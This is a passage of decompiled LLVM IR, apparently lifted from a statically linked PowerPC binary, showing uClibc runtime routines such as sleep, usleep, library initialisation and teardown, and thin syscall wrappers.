  store i32 %v1_100108dc39, i32* %ctr.global-to-local, align 4
  %v2_100108dc40 = icmp eq i32 %v1_100108dc39, 0
  br i1 %v2_100108dc40, label %dec_label_pc_100108e0, label %dec_label_pc_100108cc.dec_label_pc_100108cc_crit_edge

dec_label_pc_100108cc.dec_label_pc_100108cc_crit_edge: ; preds = %dec_label_pc_100108cc.lr.ph, %dec_label_pc_100108cc.dec_label_pc_100108cc_crit_edge
  %v2_100108d841 = phi i32 [ %v2_100108d8, %dec_label_pc_100108cc.dec_label_pc_100108cc_crit_edge ], [ %v2_100108d837, %dec_label_pc_100108cc.lr.ph ]
  %v0_100108cc.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_100108cc = add i32 %v2_100108d841, 8
  %v3_100108cc = inttoptr i32 %v2_100108cc to i32*
  store i32 %v0_100108cc.pre, i32* %v3_100108cc, align 4
  %v0_100108d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100108d0 = add i32 %v0_100108d0, -1
  store i32 %v1_100108d0, i32* %r11.global-to-local, align 4
  %v1_100108d4 = mul i32 %v1_100108d0, 4
  %v1_100108d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100108d8 = add i32 %v1_100108d8, %v1_100108d4
  %v0_100108dc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100108dc = add i32 %v0_100108dc, -1
  store i32 %v1_100108dc, i32* %ctr.global-to-local, align 4
  %v2_100108dc = icmp eq i32 %v1_100108dc, 0
  br i1 %v2_100108dc, label %dec_label_pc_100108e0, label %dec_label_pc_100108cc.dec_label_pc_100108cc_crit_edge

dec_label_pc_100108e0:                            ; preds = %dec_label_pc_100108cc.dec_label_pc_100108cc_crit_edge, %dec_label_pc_100108cc.lr.ph
  store i32 %v2_10010860, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_100108e8 = call i32 @__sigaddset()
  store i32 %v0_100108e8, i32* %r3.global-to-local, align 4
  %v1_100108ec = icmp slt i32 %v0_100108e8, 0
  br i1 %v1_100108ec, label %dec_label_pc_100109d8, label %dec_label_pc_100108f4

dec_label_pc_100108f4:                            ; preds = %dec_label_pc_100108e0
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_100108fc = ptrtoint i32* %stack_var_-176 to i32
  store i32 268503300, i32* @lr, align 4
  %v4_10010900 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_100108fc)
  store i32 %v4_10010900, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_10010900, -1
  br i1 %tmp30, label %dec_label_pc_10010934, label %dec_label_pc_1001090c

dec_label_pc_1001090c:                            ; preds = %dec_label_pc_100108f4
  %v0_1001090c = call i32 @__errno_location()
  store i32 %v0_1001090c, i32* %r3.global-to-local, align 4
  %v1_10010914 = inttoptr i32 %v0_1001090c to i32*
  %v2_10010914 = load i32, i32* %v1_10010914, align 4
  store i32 %v0_1001090c, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268503336, i32* @lr, align 4
  %v3_10010924 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10010884, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1001092c = inttoptr i32 %v0_1001090c to i32*
  store i32 %v2_10010914, i32* %v2_1001092c, align 4
  %v0_100109ec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100109dc

dec_label_pc_10010934:                            ; preds = %dec_label_pc_100108f4
  %v3_10010934 = load i32, i32* %stack_var_-176, align 4
  %v3_10010940 = icmp eq i32 %v3_10010934, 1
  br i1 %v3_10010940, label %dec_label_pc_10010948, label %dec_label_pc_1001097c

dec_label_pc_10010948:                            ; preds = %dec_label_pc_10010934
  store i32 %v2_10010840, i32* %r3.global-to-local, align 4
  store i32 268503380, i32* @lr, align 4
  %v2_10010950 = call i32 @__libc_nanosleep(i32 %v2_10010840, i32 %v2_10010840)
  store i32 %v2_10010950, i32* %r3.global-to-local, align 4
  store i32 %v2_10010950, i32* @r31, align 4
  %v0_10010958 = call i32 @__errno_location()
  store i32 %v0_10010958, i32* %r3.global-to-local, align 4
  store i32 %v0_10010958, i32* %r29.global-to-local, align 4
  %v1_10010968 = inttoptr i32 %v0_10010958 to i32*
  %v2_10010968 = load i32, i32* %v1_10010968, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268503412, i32* @lr, align 4
  %v3_10010970 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10010884, i32 0)
  store i32 %v3_10010970, i32* %r3.global-to-local, align 4
  %v1_10010974 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010974 = inttoptr i32 %v1_10010974 to i32*
  store i32 %v2_10010968, i32* %v2_10010974, align 4
  %v0_100109a4.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_100109a4

dec_label_pc_1001097c:                            ; preds = %dec_label_pc_10010934
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268503436, i32* @lr, align 4
  %v3_10010988 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10010884, i32 0)
  br label %dec_label_pc_10010998

dec_label_pc_10010998:                            ; preds = %dec_label_pc_100108a0, %dec_label_pc_1001097c
  store i32 %v2_10010840, i32* %r3.global-to-local, align 4
  store i32 268503456, i32* @lr, align 4
  %v2_1001099c = call i32 @__libc_nanosleep(i32 %v2_10010840, i32 %v2_10010840)
  store i32 %v2_1001099c, i32* %r3.global-to-local, align 4
  store i32 %v2_1001099c, i32* @r31, align 4
  br label %dec_label_pc_100109a4

dec_label_pc_100109a4:                            ; preds = %dec_label_pc_10010948, %dec_label_pc_10010998
  %v0_100109a4 = phi i32 [ %v0_100109a4.pr, %dec_label_pc_10010948 ], [ %v2_1001099c, %dec_label_pc_10010998 ]
  %v3_100109a4 = icmp eq i32 %v0_100109a4, 0
  br i1 %v3_100109a4, label %dec_label_pc_100109d0, label %dec_label_pc_100109ac

dec_label_pc_100109ac:                            ; preds = %dec_label_pc_100109a4
  %v3_100109bc = load i32, i32* %stack_var_-440, align 4
  %v0_100109c0 = call i32 @__asm_mfcr()
  store i32 %v0_100109c0, i32* %r3.global-to-local, align 4
  %v1_100109c4 = call i32 @__asm_rlwinm(i32 %v0_100109c0, i32 30, i32 31, i32 31)
  %v2_100109c8 = add i32 %v3_100109bc, %v1_100109c4
  store i32 %v2_100109c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100109dc

dec_label_pc_100109d0:                            ; preds = %dec_label_pc_100109a4, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100109dc

dec_label_pc_100109d8:                            ; preds = %dec_label_pc_10010884, %dec_label_pc_100108e0, %dec_label_pc_10010860
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100109dc

dec_label_pc_100109dc:                            ; preds = %dec_label_pc_100109d0, %dec_label_pc_100109ac, %dec_label_pc_1001090c, %dec_label_pc_100109d8
  %v0_100109ec = phi i32 [ 0, %dec_label_pc_100109d0 ], [ %v2_100109c8, %dec_label_pc_100109ac ], [ %v0_100109ec.pre, %dec_label_pc_1001090c ], [ -1, %dec_label_pc_100109d8 ]
  ret i32 %v0_100109ec

; uselistorder directives
  uselistorder i32 %v1_100108dc, { 1, 0 }
  uselistorder i32 %v2_10010884, { 2, 1, 0, 4, 3, 5, 6 }
  uselistorder i32 %v1_1001085c, { 1, 0 }
  uselistorder i32 %v2_10010840, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 1, 6, 2, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r11.global-to-local, { 4, 6, 7, 0, 1, 5, 8, 9, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 4, 6, 7, 0, 1, 5, 8, 9, 2, 3 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_100109dc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100109d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100109a4, { 1, 0 }
  uselistorder label %dec_label_pc_10010998, { 1, 0 }
  uselistorder label %dec_label_pc_100108cc.dec_label_pc_100108cc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001084c.dec_label_pc_1001084c_crit_edge, { 1, 0 }
}

define i32 @usleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_10010a0c = udiv i32 %arg1, 1000000
  %v2_10010a10 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10010a0c, i32* %stack_var_-24, align 4
  store i32 268503596, i32* @lr, align 4
  %v2_10010a28 = call i32 @__libc_nanosleep(i32 %v2_10010a10, i32 0)
  ret i32 %v2_10010a28

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 0, 2, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_10010a8c:
  %v3_10010a90 = load i32, i32* @global_var_10028604.661, align 4
  %v3_10010a94 = icmp eq i32 %v3_10010a90, 0
  br i1 %v3_10010a94, label %dec_label_pc_10010aa4, label %dec_label_pc_10010a9c

dec_label_pc_10010a9c:                            ; preds = %dec_label_pc_10010a8c
  %v2_10010aa0 = load i32, i32* @r4, align 4
  %v3_10010aa0 = call i32 @unknown_0(i32 268632064, i32 %v2_10010aa0)
  store i32 %v3_10010aa0, i32* @r3, align 4
  br label %dec_label_pc_10010aa4

dec_label_pc_10010aa4:                            ; preds = %dec_label_pc_10010a8c, %dec_label_pc_10010a9c
  %v3_10010aa8 = load i32, i32* @global_var_10028608.662, align 4
  %v3_10010aac = icmp eq i32 %v3_10010aa8, 0
  br i1 %v3_10010aac, label %dec_label_pc_10010aa4.dec_label_pc_10010abc_crit_edge, label %dec_label_pc_10010ab4

dec_label_pc_10010aa4.dec_label_pc_10010abc_crit_edge: ; preds = %dec_label_pc_10010aa4
  %v0_10010acc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10010abc

dec_label_pc_10010ab4:                            ; preds = %dec_label_pc_10010aa4
  %v2_10010ab8 = load i32, i32* @r4, align 4
  %v3_10010ab8 = call i32 @unknown_0(i32 268632064, i32 %v2_10010ab8)
  br label %dec_label_pc_10010abc

dec_label_pc_10010abc:                            ; preds = %dec_label_pc_10010aa4.dec_label_pc_10010abc_crit_edge, %dec_label_pc_10010ab4
  %v0_10010acc = phi i32 [ %v0_10010acc.pre, %dec_label_pc_10010aa4.dec_label_pc_10010abc_crit_edge ], [ %v3_10010ab8, %dec_label_pc_10010ab4 ]
  ret i32 %v0_10010acc

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010abc, { 1, 0 }
  uselistorder label %dec_label_pc_10010aa4, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_10010ad8 = load i32, i32* @r3, align 4
  ret i32 %v0_10010ad8
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268503808, i32* @lr, align 4
  %v2_10010afc = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_10010b00 = icmp eq i32 %v2_10010afc, -1
  br i1 %v3_10010b00, label %dec_label_pc_10010b08, label %dec_label_pc_10010b28

dec_label_pc_10010b08:                            ; preds = %entry
  %v0_10010b0c = load i32, i32* @r30, align 4
  store i32 268503836, i32* @lr, align 4
  %v3_10010b18 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_100177ac.663 to i32), i32 %v0_10010b0c)
  %v1_10010b1c = load i32, i32* @r31, align 4
  %v4_10010b1c = icmp eq i32 %v3_10010b18, %v1_10010b1c
  br i1 %v4_10010b1c, label %dec_label_pc_10010b28, label %dec_label_pc_10010b24

dec_label_pc_10010b24:                            ; preds = %dec_label_pc_10010b08
  %v1_10010b24 = call i32 @abort(i32 %v3_10010b18)
  br label %dec_label_pc_10010b28

dec_label_pc_10010b28:                            ; preds = %entry, %dec_label_pc_10010b08, %dec_label_pc_10010b24
  %v0_10010b38 = phi i32 [ %v2_10010afc, %entry ], [ %v3_10010b18, %dec_label_pc_10010b08 ], [ %v1_10010b24, %dec_label_pc_10010b24 ]
  ret i32 %v0_10010b38

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 3, 5, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_10010b28, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10010b5c = load i32, i32* @global_var_1002860c.664, align 4
  %v3_10010b60 = icmp eq i32 %v3_10010b5c, 0
  br i1 %v3_10010b60, label %dec_label_pc_10010b84, label %entry.dec_label_pc_10010ba8_crit_edge

entry.dec_label_pc_10010ba8_crit_edge:            ; preds = %entry
  %v0_10010bb8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10010ba8

dec_label_pc_10010b84:                            ; preds = %entry
  store i32 1, i32* @global_var_1002860c.664, align 4
  store i32 4096, i32* @global_var_10028600.581, align 4
  %v1_10010ba4 = call i32 @_stdio_init(i32 268488036)
  br label %dec_label_pc_10010ba8

dec_label_pc_10010ba8:                            ; preds = %entry.dec_label_pc_10010ba8_crit_edge, %dec_label_pc_10010b84
  %v0_10010bb8 = phi i32 [ %v0_10010bb8.pre, %entry.dec_label_pc_10010ba8_crit_edge ], [ %v1_10010ba4, %dec_label_pc_10010b84 ]
  ret i32 %v0_10010bb8

; uselistorder directives
  uselistorder label %dec_label_pc_10010ba8, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_10010bd4 = mul i32 %arg2, 4
  %v2_10010bd8 = add i32 %tmp, %v1_10010bd4
  %v0_10010bdc = load i32, i32* @r9, align 4
  store i32 %v0_10010bdc, i32* @global_var_100285f8.665, align 4
  %v1_10010be0 = add i32 %v2_10010bd8, 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 %v1_10010be0, i32* @global_var_100285fc.659, align 4
  store i32 %arg6, i32* @global_var_10028608.662, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_10010c00 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_10010c08 = icmp eq i32 %v1_10010be0, %v2_10010c00
  br i1 %v4_10010c08, label %dec_label_pc_10010c10, label %dec_label_pc_10010c14

dec_label_pc_10010c10:                            ; preds = %entry
  store i32 %v2_10010bd8, i32* @global_var_100285fc.659, align 4
  br label %dec_label_pc_10010c14

dec_label_pc_10010c14:                            ; preds = %entry, %dec_label_pc_10010c10
  %v2_10010c14 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268504100, i32* @lr, align 4
  %v3_10010c20 = call i32 @__GI_memset(i32 %v2_10010c14, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_100285fc.659, align 4
  br label %dec_label_pc_10010c30

dec_label_pc_10010c30:                            ; preds = %dec_label_pc_10010c30, %dec_label_pc_10010c14
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10010c14 ], [ %v1_10010c34, %dec_label_pc_10010c30 ]
  %v1_10010c30 = inttoptr i32 %storemerge to i32*
  %v2_10010c30 = load i32, i32* %v1_10010c30, align 4
  %v1_10010c34 = add i32 %storemerge, 4
  %v3_10010c38 = icmp eq i32 %v2_10010c30, 0
  br i1 %v3_10010c38, label %dec_label_pc_10010c40, label %dec_label_pc_10010c30

dec_label_pc_10010c40:                            ; preds = %dec_label_pc_10010c30
  store i32 %v1_10010c34, i32* %r29.global-to-local, align 4
  %v1_10010c6c12 = inttoptr i32 %v1_10010c34 to i32*
  %v2_10010c6c13 = load i32, i32* %v1_10010c6c12, align 4
  %v3_10010c7016 = icmp eq i32 %v2_10010c6c13, 0
  br i1 %v3_10010c7016, label %dec_label_pc_10010c78, label %dec_label_pc_10010c48

dec_label_pc_10010c48:                            ; preds = %dec_label_pc_10010c40, %dec_label_pc_10010c68
  %v0_10010c5c = phi i32 [ %v1_10010c68, %dec_label_pc_10010c68 ], [ %v1_10010c34, %dec_label_pc_10010c40 ]
  %v0_10010c50 = phi i32 [ %v2_10010c6c, %dec_label_pc_10010c68 ], [ %v2_10010c6c13, %dec_label_pc_10010c40 ]
  %v2_10010c48 = icmp ugt i32 %v0_10010c50, 14
  br i1 %v2_10010c48, label %dec_label_pc_10010c68, label %dec_label_pc_10010c50

dec_label_pc_10010c50:                            ; preds = %dec_label_pc_10010c48
  %v1_10010c50 = mul i32 %v0_10010c50, 8
  %v2_10010c58 = add i32 %v1_10010c50, %v2_10010c14
  store i32 %v2_10010c58, i32* @r3, align 4
  store i32 %v0_10010c5c, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268504168, i32* @lr, align 4
  %v0_10010c64 = call i32 @memcpy()
  %v0_10010c68.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10010c68

dec_label_pc_10010c68:                            ; preds = %dec_label_pc_10010c48, %dec_label_pc_10010c50
  %v0_10010c68 = phi i32 [ %v0_10010c5c, %dec_label_pc_10010c48 ], [ %v0_10010c68.pre, %dec_label_pc_10010c50 ]
  %v1_10010c68 = add i32 %v0_10010c68, 8
  store i32 %v1_10010c68, i32* %r29.global-to-local, align 4
  %v1_10010c6c = inttoptr i32 %v1_10010c68 to i32*
  %v2_10010c6c = load i32, i32* %v1_10010c6c, align 4
  %v3_10010c70 = icmp eq i32 %v2_10010c6c, 0
  br i1 %v3_10010c70, label %dec_label_pc_10010c78, label %dec_label_pc_10010c48

dec_label_pc_10010c78:                            ; preds = %dec_label_pc_10010c68, %dec_label_pc_10010c40
  %v1_10010c7c = call i32 @_dl_aux_init(i32 %v2_10010c14)
  store i32 %v1_10010c7c, i32* @r3, align 4
  store i32 268504196, i32* @lr, align 4
  %v1_10010c80 = call i32 @__GI___uClibc_init(i32 %v1_10010c7c)
  %v3_10010c88 = icmp eq i32 %tmp27, 0
  br i1 %v3_10010c88, label %dec_label_pc_10010c90, label %dec_label_pc_10010c94

dec_label_pc_10010c90:                            ; preds = %dec_label_pc_10010c78
  br label %dec_label_pc_10010c94

dec_label_pc_10010c94:                            ; preds = %dec_label_pc_10010c78, %dec_label_pc_10010c90
  %v0_10010c9c = phi i32 [ %tmp27, %dec_label_pc_10010c78 ], [ 4096, %dec_label_pc_10010c90 ]
  store i32 %v0_10010c9c, i32* @global_var_10028600.581, align 4
  %v3_10010ca0 = icmp eq i32 %tmp26, -1
  br i1 %v3_10010ca0, label %dec_label_pc_10010ca8, label %dec_label_pc_10010cdc

dec_label_pc_10010ca8:                            ; preds = %dec_label_pc_10010c94
  store i32 268504236, i32* @lr, align 4
  %v1_10010ca8 = call i32 @getuid(i32 268632064)
  store i32 %v1_10010ca8, i32* %r29.global-to-local, align 4
  store i32 268504244, i32* @lr, align 4
  %v0_10010cb0 = call i32 @geteuid()
  %v4_10010cb4 = icmp eq i32 %v1_10010ca8, %v0_10010cb0
  br i1 %v4_10010cb4, label %dec_label_pc_10010cbc, label %dec_label_pc_10010cf8

dec_label_pc_10010cbc:                            ; preds = %dec_label_pc_10010ca8
  store i32 268504256, i32* @lr, align 4
  %v1_10010cbc = call i32 @getgid(i32 %v0_10010cb0)
  store i32 %v1_10010cbc, i32* %r29.global-to-local, align 4
  store i32 268504264, i32* @lr, align 4
  %v0_10010cc4 = call i32 @getegid()
  %v4_10010cc8 = icmp eq i32 %v1_10010cbc, %v0_10010cc4
  br i1 %v4_10010cc8, label %dec_label_pc_10010cd0.thread, label %dec_label_pc_10010cf8

dec_label_pc_10010cd0.thread:                     ; preds = %dec_label_pc_10010cbc
  br label %dec_label_pc_10010d28

dec_label_pc_10010cdc:                            ; preds = %dec_label_pc_10010c94
  %v4_10010ce0 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10010ce0, label %dec_label_pc_10010ce8, label %dec_label_pc_10010cf8

dec_label_pc_10010ce8:                            ; preds = %dec_label_pc_10010cdc
  br label %dec_label_pc_10010cf8

dec_label_pc_10010cf8:                            ; preds = %dec_label_pc_10010ce8, %dec_label_pc_10010cdc, %dec_label_pc_10010cbc, %dec_label_pc_10010ca8
  store i32 268504328, i32* @lr, align 4
  %v2_10010d04 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268504344, i32* @lr, align 4
  %v2_10010d14 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268504360, i32* @lr, align 4
  %v2_10010d24 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_10010d28

dec_label_pc_10010d28:                            ; preds = %dec_label_pc_10010cd0.thread, %dec_label_pc_10010cf8
  %v0_10010d34 = load i32, i32* @r30, align 4
  %v1_10010d34 = inttoptr i32 %v0_10010d34 to i32*
  %v2_10010d34 = load i32, i32* %v1_10010d34, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_10010d34, i32* inttoptr (i32 268600740 to i32*), align 4
  %v0_10010d54 = load i32, i32* @r27, align 4
  store i32 %v0_10010d54, i32* @global_var_10028604.661, align 4
  br i1 false, label %dec_label_pc_10010d5c, label %dec_label_pc_10010dd4

dec_label_pc_10010d5c:                            ; preds = %dec_label_pc_10010d28, %dec_label_pc_10010d5c
  br i1 undef, label %dec_label_pc_10010d5c, label %dec_label_pc_10010dd4

dec_label_pc_10010dd4:                            ; preds = %dec_label_pc_10010d5c, %dec_label_pc_10010d28
  %v0_10010d80 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10010d80)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10010de4 = call i32 @__errno_location()
  %v2_10010dec = inttoptr i32 %v0_10010de4 to i32*
  store i32 0, i32* %v2_10010dec, align 4
  %v0_10010e00 = call i32 @__GI___h_errno_location()
  %v2_10010e08 = inttoptr i32 %v0_10010e00 to i32*
  store i32 0, i32* %v2_10010e08, align 4
  %v0_10010e18 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10010e18)
  %v0_10010e24 = call i32 @__GI_exit()
  ret i32 %v0_10010e24

; uselistorder directives
  uselistorder i32 %v2_10010c6c, { 1, 0 }
  uselistorder i32 %v1_10010c68, { 2, 1, 0 }
  uselistorder i32 %v1_10010c34, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10010c14, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 2, 1, 4, 5, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 3, 14, 15, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32 14, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10010d5c, { 1, 0 }
  uselistorder label %dec_label_pc_10010d28, { 1, 0 }
  uselistorder label %dec_label_pc_10010c94, { 1, 0 }
  uselistorder label %dec_label_pc_10010c68, { 1, 0 }
  uselistorder label %dec_label_pc_10010c48, { 1, 0 }
  uselistorder label %dec_label_pc_10010c14, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_10010e34 = load i32, i32* @r3, align 4
  store i32 %v0_10010e34, i32* @r29, align 4
  %v0_10010e3c = call i32 @__errno_location()
  %v0_10010e40 = load i32, i32* @r29, align 4
  %v2_10010e40 = inttoptr i32 %v0_10010e3c to i32*
  store i32 %v0_10010e40, i32* %v2_10010e40, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010e74 = call i32 @__asm_mfcr()
  %v1_10010e78 = and i32 %v0_10010e74, 268435456
  %v3_10010e78 = icmp eq i32 %v1_10010e78, 0
  store i32 %v0_10010e74, i32* %r31.global-to-local, align 4
  br i1 %v3_10010e78, label %dec_label_pc_10010e90, label %dec_label_pc_10010e84

dec_label_pc_10010e84:                            ; preds = %entry
  %v0_10010e84 = call i32 @__errno_location()
  %v0_10010e88 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010e88 = inttoptr i32 %v0_10010e84 to i32*
  store i32 %v0_10010e88, i32* %v2_10010e88, align 4
  br label %dec_label_pc_10010e90

dec_label_pc_10010e90:                            ; preds = %entry, %dec_label_pc_10010e84
  %v0_10010ea0 = phi i32 [ %v0_10010e74, %entry ], [ -1, %dec_label_pc_10010e84 ]
  ret i32 %v0_10010ea0

; uselistorder directives
  uselistorder label %dec_label_pc_10010e90, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010ebc = call i32 @__asm_mfcr()
  %v1_10010ec0 = and i32 %v0_10010ebc, 268435456
  %v3_10010ec0 = icmp eq i32 %v1_10010ec0, 0
  store i32 %v0_10010ebc, i32* %r31.global-to-local, align 4
  br i1 %v3_10010ec0, label %dec_label_pc_10010ed8, label %dec_label_pc_10010ecc

dec_label_pc_10010ecc:                            ; preds = %entry
  %v0_10010ecc = call i32 @__errno_location()
  %v0_10010ed0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010ed0 = inttoptr i32 %v0_10010ecc to i32*
  store i32 %v0_10010ed0, i32* %v2_10010ed0, align 4
  br label %dec_label_pc_10010ed8

dec_label_pc_10010ed8:                            ; preds = %entry, %dec_label_pc_10010ecc
  %v0_10010ee8 = phi i32 [ %v0_10010ebc, %entry ], [ -1, %dec_label_pc_10010ecc ]
  ret i32 %v0_10010ee8

; uselistorder directives
  uselistorder label %dec_label_pc_10010ed8, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010f04 = call i32 @__asm_mfcr()
  %v1_10010f08 = and i32 %v0_10010f04, 268435456
  %v3_10010f08 = icmp eq i32 %v1_10010f08, 0
  store i32 %v0_10010f04, i32* %r31.global-to-local, align 4
  br i1 %v3_10010f08, label %dec_label_pc_10010f20, label %dec_label_pc_10010f14

dec_label_pc_10010f14:                            ; preds = %entry
  %v0_10010f14 = call i32 @__errno_location()
  %v0_10010f18 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010f18 = inttoptr i32 %v0_10010f14 to i32*
  store i32 %v0_10010f18, i32* %v2_10010f18, align 4
  br label %dec_label_pc_10010f20

dec_label_pc_10010f20:                            ; preds = %entry, %dec_label_pc_10010f14
  %v0_10010f30 = phi i32 [ %v0_10010f04, %entry ], [ -1, %dec_label_pc_10010f14 ]
  ret i32 %v0_10010f30

; uselistorder directives
  uselistorder label %dec_label_pc_10010f20, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010f4c = call i32 @__asm_mfcr()
  %v1_10010f50 = and i32 %v0_10010f4c, 268435456
  %v3_10010f50 = icmp eq i32 %v1_10010f50, 0
  store i32 %v0_10010f4c, i32* %r31.global-to-local, align 4
  br i1 %v3_10010f50, label %dec_label_pc_10010f68, label %dec_label_pc_10010f5c

dec_label_pc_10010f5c:                            ; preds = %entry
  %v0_10010f5c = call i32 @__errno_location()
  %v0_10010f60 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010f60 = inttoptr i32 %v0_10010f5c to i32*
  store i32 %v0_10010f60, i32* %v2_10010f60, align 4
  br label %dec_label_pc_10010f68

dec_label_pc_10010f68:                            ; preds = %entry, %dec_label_pc_10010f5c
  %v0_10010f78 = phi i32 [ %v0_10010f4c, %entry ], [ -1, %dec_label_pc_10010f5c ]
  ret i32 %v0_10010f78

; uselistorder directives
  uselistorder label %dec_label_pc_10010f68, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010f94 = call i32 @__asm_mfcr()
  %v1_10010f98 = and i32 %v0_10010f94, 268435456
  %v3_10010f98 = icmp eq i32 %v1_10010f98, 0
  store i32 %v0_10010f94, i32* %r31.global-to-local, align 4
  br i1 %v3_10010f98, label %dec_label_pc_10010fb0, label %dec_label_pc_10010fa4

dec_label_pc_10010fa4:                            ; preds = %entry
  %v0_10010fa4 = call i32 @__errno_location()
  %v0_10010fa8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010fa8 = inttoptr i32 %v0_10010fa4 to i32*
  store i32 %v0_10010fa8, i32* %v2_10010fa8, align 4
  br label %dec_label_pc_10010fb0

dec_label_pc_10010fb0:                            ; preds = %entry, %dec_label_pc_10010fa4
  %v0_10010fc0 = phi i32 [ %v0_10010f94, %entry ], [ -1, %dec_label_pc_10010fa4 ]
  ret i32 %v0_10010fc0

; uselistorder directives
